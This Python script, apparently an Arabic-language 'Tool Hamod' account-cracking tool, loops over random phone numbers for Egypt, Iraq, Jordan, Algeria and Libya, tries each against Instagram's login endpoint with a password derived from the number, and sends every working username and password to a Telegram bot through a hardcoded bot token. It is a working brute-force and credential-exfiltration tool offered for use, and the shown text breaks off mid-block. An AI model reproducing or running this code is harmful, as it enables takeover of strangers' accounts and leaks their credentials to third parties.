import random, requests, pyfiglet
from user_agent import generate_user_agent
import os
import sys
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
re = requests.get("https://pastebin.com/iF7qQ9R2")
p = input(Z+"    Tool Password :")
if p == "" :
  sys.exit()
if p in str(re.text):
  print("you Are Active Smahi")
else:
  print(B+"password error came Smahi @FYFFFF")
  sys.exit()
os.system("clear")

ID = input(F+' Enter ID BoT: ')
token = '1910195205:AAE7cPbdbOpOBRbieg9DSpTrzyEi3RPI9l0'

r = requests.Session()

lo = pyfiglet.figlet_format(' Tool Hamod ')
print(A+lo)
print(Y+''' 
   ==============================
   ==============================
    [1] - 010 :          ■EGYPT  
    [2] - 011 :          ■EGYPT  
    [3] - 012 :          ■EGYPT  
    [4] - 015 :          ■EGYPT  
   ==============================
    [5] - 077 :          ■IRAQ  
    [6] - 075 :          ■IRAQ  
   ==============================
    [7] - 077 :          ■JORDAN  
    [8] - 078 :          ■JORDAN  
    [9] - 079 :          ■JORDAN  
   ==============================
    [10] - 05 :          ■Algeria  
    [11] - 06 :          ■Algeria  
    [12] - 07 :          ■Algeria 
   ==============================
    [13] - 091 :         ■LIBYA  
    [14] - 092 :         ■LIBYA  
    [15] - 094 :         ■LIBYA  
   ==============================
    [16] - 093 :         ■SYRIA  
    [17] - 094 :         ■SYRIA  
    [18] - 095 :         ■SYRIA  
    [19] - 096 :         ■SYRIA  
    [20] - 099 :         ■SYRIA  
   ==============================
   ==============================
''')


AS = input(' \n- CHOOSE THE NUMBER OF YOUR COUNTRY : ')

if (AS == '1'):
	user = '1234567890'
	a = '+2010'
	u = '010'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = '+2010' + us
		password = '010' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • Heloo Now Account 📩\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF \n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
if (AS == '2'):
	user = '1234567890'
	a = '+2011'
	u = '011'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = '+2011' + us
		password = '011' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= •𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n• ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')	
			
			
						
if (AS == '3'):
	user = '1234567890'
	a = '+2012'
	u = '012'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = '+2012' + us
		password = '012' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n• ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')	
			
			
						
if (AS == '4'):
	user = '1234567890'
	a = '+2015'
	u = '015'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = '+2015' + us
		password = '015' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F+username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n• ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')	
			
if (AS == '5'):
	user = '1234567890'
	a = '+964770'
	u = '0770'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+964770' + us
		password = '0770' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
if (AS == '6'):
	user = '1234567890'
	a = '+96475'
	u = '075'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = '+96475' + us
		password = '075' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			

if (AS == '7'):
	user = '1234567890'
	a = '+96277'
	u = '077'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+96277' + us
		password = '077' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
			
if (AS == '8'):
	user = '1234567890'
	a = '+96278'
	u = '078'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+96278' + us
		password = '078' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
			
if (AS == '9'):
	user = '1234567890'
	a = '+96279'
	u = '079'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+96279' + us
		password = '079' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
			
			
if (AS == '10'):
	user = '1234567890'
	a = '+2135'
	u = '05'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = '+2135' + us
		password = '05' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
			
			
if (AS == '11'):
	user = '1234567890'
	a = '+2136'
	u = '06'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = '+2136' + us
		password = '06' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
			
			
if (AS == '12'):
	user = '1234567890'
	a = '+2137'
	u = '07'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(8)))
		username = '+2137' + us
		password = '07' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
			
			
if (AS == '13'):
	user = '1234567890'
	a = '+21891'
	u = '091'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+21891' + us
		password = '091' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
			
			
if (AS == '14'):
	user = '1234567890'
	a = '+21892'
	u = '092'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+21892' + us
		password = '092' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
		data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}
         
		req_login = r.post(url, headers=headers, data=data, proxies=None)
		
		if 'userId' in req_login.text:
			print(F + username + ' - ' + password + ' ■SUCCEED')
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝐇𝐞𝐥𝐥𝐨 𝐍𝐨𝐰 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 ♔︎
\n━━━━━━━━━━━━━\n- EMAIL ➪ {username} ✓\n- Pass ➪ {password} \n━━━━━━━━━━━━━\n• Ch ➪ @FYFFFF\n━━━━━━━━━━━━━\n•   ''')
			i = requests.post(tlg)
			
		else:
			print(Z+username + ' - ' + password +' ■FAILED')
			
			
			
if (AS == '15'):
	user = '1234567890'
	a = '+21894'
	u = '094'
	while True:
		
		us = str(''.join(random.choice(user) for i in range(7)))
		username = '+21894' + us
		password = '094' + us
	
		url = 'https://www.instagram.com/accounts/login/ajax/'
	
		headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
